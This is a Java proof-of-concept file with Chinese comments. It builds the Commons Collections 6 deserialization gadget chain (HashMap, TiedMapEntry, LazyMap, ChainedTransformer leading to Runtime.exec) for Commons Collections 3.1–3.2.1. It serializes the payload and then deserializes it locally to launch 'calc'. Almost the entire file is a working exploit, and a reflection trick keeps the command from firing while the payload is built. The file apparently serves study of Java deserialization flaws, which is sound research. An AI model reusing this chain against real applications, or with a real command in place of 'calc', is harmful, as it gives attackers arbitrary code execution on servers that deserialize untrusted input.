package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * 测试环境：3.1-3.2.1，jdk1.7,1.8
 *
 * CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，
 * 除了 BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ HashMap!
 *
 * 这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同
 *   ->HashMap.readObject()
 *       ->HashMap.putForCreate()
 *           ->HashMap.hash()
 *             ->TiedMapEntry.hashCode()
 *                     ->TiedMapEntry.getValue()
 *                     ->LazyMap.get()
 *                       ->ChainedTransformer.transform()
 *                           ->ConstantTransformer.transform()
 *                               ->InvokerTransformer.transform()
 *                                   ->…………
 */
public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformer = new Transformer[]{};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");


        //通过反射设置真的 ransformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //清空由于 hashMap.put 对 LazyMap 造成的影响
        lazyMap.clear();

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
